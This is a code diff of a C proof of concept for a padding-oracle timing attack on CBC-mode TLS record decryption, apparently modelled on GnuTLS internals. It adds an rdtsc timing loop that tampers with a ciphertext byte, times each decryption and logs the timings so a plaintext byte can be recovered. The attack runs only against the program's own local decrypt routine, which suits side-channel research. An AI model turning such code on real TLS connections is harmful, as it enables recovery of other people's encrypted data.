@@ -19,6 +19,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#define debug 0
+
 #if defined(_WIN32)//
 
 int main()
@@ -55,7 +57,7 @@ static int encrypt(cipher_st* cipher_vector)
 	return ret;
 }
 
-static uint8_t* readPlaintext(int* length, char* file_name)
+static uint8_t* read_plaintext(int* length, char* file_name)
 {
 	size_t file_size;
 	uint8_t* in_buffer;
@@ -80,7 +82,7 @@ static uint8_t* readPlaintext(int* length, char* file_name)
 	return in_buffer;
 }
 
-static void setHeader(uint8_t* buffer)
+static void set_header(uint8_t* buffer)
 {
     int i;
     for(i = 0; i < TLS_HANDSHAKE_HEADER_LENGTH; i++)
@@ -89,21 +91,24 @@ static void setHeader(uint8_t* buffer)
     }
 }
 
-static int setPlaintext(uint8_t* buffer)
+static int set_plaintext(uint8_t* buffer)
 {
     int ret;
 	char* file_name = "./plaintext";
 	uint8_t* plaintext;
-	plaintext = readPlaintext(&ret, file_name);
+	plaintext = read_plaintext(&ret, file_name);
 
-	printf("plaintext is: \n");
-    printStringToHex(plaintext,0,ret);
+	if(debug)
+	{
+        printf("plaintext is: \n");
+        print_string_to_hex(plaintext,0,ret);
+	}
     memcpy(buffer + TLS_HANDSHAKE_HEADER_LENGTH, plaintext, ret);
 
     return ret;
 }
 
-static int setMAC(mac_st* mac_vector, uint8_t* buffer)
+static int calculate_MAC(mac_st* mac_vector)
 {
     int ret;
     gnutls_hmac_hd_t hd;
@@ -113,20 +118,24 @@ static int setMAC(mac_st* mac_vector, uint8_t* buffer)
 
     gnutls_hmac_deinit(hd,mac_vector->output);
 
-    memcpy(buffer + mac_vector->plaintext_size, mac_vector->output,
-    mac_vector->output_size);
-    printf("MAC is : \n");
-    printStringToHex(mac_vector->output, 0, mac_vector->output_size);
-    printf("MAC's Length is %d \n\n", mac_vector->output_size);
-
+    if(debug)
+    {
+        printf("MAC is : \n");
+        print_string_to_hex(mac_vector->output, 0, mac_vector->output_size);
+        printf("MAC's Length is %d \n\n", mac_vector->output_size);
+    }
     return ret;
 }
 /*set length for encrypt can be divided by block_size*/
-static int setPadding(uint8_t* buffer,uint16_t block_size, int position)
+static int set_padding(uint8_t* buffer,uint16_t block_size, int position)
 {
     unsigned int pad;
     pad = block_size - position % block_size;
-    printf("Pad is : %d\n\n",pad);
+
+    if(debug)
+    {
+        printf("Pad is : %d\n\n",pad);
+    }
     if(pad > 0)
     {
         memset(buffer + position,pad - 1, pad);
@@ -134,7 +143,7 @@ static int setPadding(uint8_t* buffer,uint16_t block_size, int position)
     return position + pad;
 }
 
-static void printStringToHex(uint8_t* src, int from, int length)
+static void print_string_to_hex(uint8_t* src, int from, int length)
 {
     int i;
     /*for(i = length - 1; i >= from; i--)
@@ -165,7 +174,7 @@ static void printStringToHex(uint8_t* src, int from, int length)
 *based on its arithmetic flow
 */
 
-static void dummy_wait_t(unsigned int mac_size,
+static void dummy_wait_t(record_parameters_st* params,
 		       gnutls_datum_t* plaintext, unsigned int pad_failed,
 		       unsigned int pad, unsigned int total)
 {
@@ -174,7 +183,7 @@ static void dummy_wait_t(unsigned int mac_size,
     */
     unsigned int len;
     if (pad_failed == 0 && pad > 0) {
-        len = mac_size;
+        len = _gnutls_mac_block_size(params->mac);
         if (len > 0) {
             /* This is really specific to the current hash functions.
              * It should be removed once a protocol fix is in place.
@@ -207,6 +216,7 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
     //uint8_t temp_result[cipher_vector->ciphertext_size];
 	const uint8_t *tag_ptr;
 	unsigned int pad = 0, i;
+	uint16_t block_size;
 	int length;
 	int ret;
 
@@ -219,6 +229,16 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
 
 	gnutls_datum_t key, iv = {NULL, 0},temp_result;
 
+    block_size = gnutls_cipher_get_block_size(cipher_vector->cipher);
+
+	cipher_entry_st c;
+	c.block = 1;
+	mac_entry_st m;
+	m.block_size = block_size;
+	record_parameters_st params;
+	params.cipher = &c;
+	params.mac = &m;
+
     key.size = cipher_vector->key_size;
     key.data = (uint8_t*)malloc(key.size);
     memcpy(key.data,cipher_vector->key,cipher_vector->key_size);
@@ -227,9 +247,12 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
     iv.data = (uint8_t*)malloc(iv.size);
     memcpy(iv.data,cipher_vector->iv,cipher_vector->iv_size);
 
-    printf("temp_iv is : ");
-    printStringToHex(cipher_vector->iv,0,cipher_vector->iv_size);
-
+    if(debug)
+    {
+        printf("temp_iv is : ");
+        print_string_to_hex(cipher_vector->ciphertext,
+        cipher_vector->ciphertext_size - 2*block_size - 1 ,block_size);
+    }
     ret = gnutls_cipher_init(&cipher_hd,cipher_vector->cipher,&key,&iv);
 
     if(ret < 0)
@@ -249,9 +272,11 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
         gnutls_cipher_decrypt2(cipher_hd,cipher_vector->ciphertext,
         cipher_vector->ciphertext_size,temp_result.data,sizeof(temp_result));
 
-    printf("temp_result of plaintext is : ");
-    printStringToHex(temp_result.data,0,
-    gnutls_cipher_get_block_size(cipher_vector->cipher));
+    if(debug)
+    {
+        printf("temp_result of plaintext is : ");
+        print_string_to_hex(temp_result.data,temp_result.size - block_size - 1,block_size);
+    }
     if (ret < 0)
     {
         return gnutls_assert_val(ret);
@@ -279,6 +304,14 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
         pad_failed = 1;
         pad = 0;
     }
+
+    printf("pad_failed is : %d\n",pad_failed);
+
+    /*if(!pad_failed)
+    {
+        printf("temp_iv is : ");
+        print_string_to_hex(cipher_vector->iv,0,cipher_vector->iv_size);
+    }*/
 
     length = cipher_vector->ciphertext_size - tag_size - pad - 1;
     tag_ptr = &temp_result.data[length];
@@ -313,8 +346,7 @@ static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
 	 */
 	if(memcmp(tag, tag_ptr, tag_size) != 0 || pad_failed != 0) {
 		/* HMAC was not the same. */
-		dummy_wait_t(mac_vector->output_size,&temp_result,pad_failed,
-		pad,length + 13);
+		dummy_wait_t(&params,&temp_result,pad_failed,pad,length + 13);
 		return gnutls_assert_val(GNUTLS_E_DECRYPTION_FAILED);
 	}
 	return length;
@@ -338,7 +370,7 @@ int main()
     block_size = gnutls_cipher_get_block_size(cipher_name);
     cipher.iv_size = gnutls_cipher_get_iv_size(cipher_name);
     cipher.iv = (uint8_t*)malloc(cipher.iv_size);
-    /*cipher.iv is \x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F...*/
+    /*cipher.iv is \xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA...*/
     memset(cipher.iv,'\xFA',cipher.iv_size);
     cipher.key_size = gnutls_cipher_get_key_size(cipher_name);
     cipher.key = (uint8_t*)malloc(cipher.key_size);
@@ -357,21 +389,29 @@ int main()
 
 
     /*set Header*/
-    setHeader(buffer);
-    printf("Header is : \n");
-    printStringToHex(buffer, 0, TLS_HANDSHAKE_HEADER_LENGTH);
-    length = setPlaintext(buffer);//length of plaintext
+    set_header(buffer);
+    if(debug)
+    {
+        printf("Header is : \n");
+        print_string_to_hex(buffer, 0, TLS_HANDSHAKE_HEADER_LENGTH);
+    }
+    length = set_plaintext(buffer);//length of plaintext
 
-    /*set MAC value*/
+    /*calculate the MAC value*/
     length += TLS_HANDSHAKE_HEADER_LENGTH;
     mac.plaintext_size = length;
     mac.plaintext = (uint8_t*)malloc(mac.plaintext_size);
     memcpy(mac.plaintext,buffer,length);
-    setMAC(&mac,buffer);
+    calculate_MAC(&mac);
+
+    /*Adjust*/
+    length -= TLS_HANDSHAKE_HEADER_LENGTH;//the length of message
+    memcpy(buffer, mac.plaintext + TLS_HANDSHAKE_HEADER_LENGTH,length);
+    memcpy(buffer + length, mac.output, mac.output_size);
 
     /*set Padding and return the total value*/
     length += MAX_HASH_LENGTH;
-    length = setPadding(buffer,block_size,length);
+    length = set_padding(buffer,block_size,length);
 
 	/*set the plaintext for encryption and malloc space for ciphertext*/
 	cipher.plaintext_size = length;
@@ -379,31 +419,69 @@ int main()
 	memcpy(cipher.plaintext,buffer,length);
 	cipher.ciphertext_size = length;
 	cipher.ciphertext = (uint8_t*)malloc(cipher.ciphertext_size);
-    printf("size of plaintext is : %d\nplaintext is : \n",length);
-    printStringToHex(cipher.plaintext,0,cipher.plaintext_size);
+    if(debug)
+    {
+        printf("size of plaintext is : %d\nplaintext is : \n",length);
+        print_string_to_hex(cipher.plaintext,0,cipher.plaintext_size);
+    }
+
 
 	/*Start Encryption*/
 	encrypt(&cipher);
-    printf("ciphertext is : \n");
-    printStringToHex(cipher.ciphertext,0,cipher.ciphertext_size);
-
+    if(debug)
+    {
+        printf("ciphertext is : \n");
+        print_string_to_hex(cipher.ciphertext,0,cipher.ciphertext_size);
+    }
 	/*Start Decryption*/
 	int i;
 	uint8_t temp;
-	for(i = 0; i < 255; i++)
+	uint64_t begin,end;
+
+	FILE *slot_file = fopen("./slot_result","w");
+	fflush(stdout);
+
+	/*for(i = 0; i <= 255; i++)
 	{
         temp = (uint8_t)i;
         memset(cipher.iv,'\x00',cipher.iv_size);
-        cipher.iv[0] = temp;//set last byte of iv from 0 to 255
+        cipher.ciphertext[cipher.ciphertext_size - block_size - 1] = temp;
+        //cipher.iv[0] = temp;//set last byte of iv from 0 to 255
+        rdtsc(&begin);
         decrypt(&cipher,&mac);
+        rdtsc(&end);
+        fprintf(slot_file,"%llu\r\n",end - begin);
+        fflush(stdout);
+	}*/
+
+    /*Recovery one byte*/
+    uint16_t position;
+    position = cipher.ciphertext_size - 2*block_size - 1;
+	for(i = 0; i <= 255; i++)
+	{
+        temp = (uint8_t)i;
+        memset(cipher.ciphertext + position,'\x00',cipher.iv_size);
+        cipher.ciphertext[cipher.ciphertext_size - block_size - 1] = temp;
+        rdtsc(&begin);
+        decrypt(&cipher,&mac);
+        rdtsc(&end);
+        fprintf(slot_file,"%llu\r\n",end - begin);
+        fflush(stdout);
 	}
-	/*This setting can reach "0x02 0x02 0x02"
- 	*cipher.iv[2] = 7;
-	*cipher.iv[1] = 7;
-    *cipher.iv[0] = 7;
-	*decrypt(&cipher,&mac);
-    */
+
+    //temp = 0x92(192) pad is correct and we will decryt the last blokc firstly
+    fclose(slot_file);
 	return 0;
 }
+
+static void rdtsc(uint64_t* result)
+{
+    asm(
+        "rdtsc\n\t"
+        :"=A"(*result)
+    );
+}
+
+
 
 #endif				/* _WIN32 */
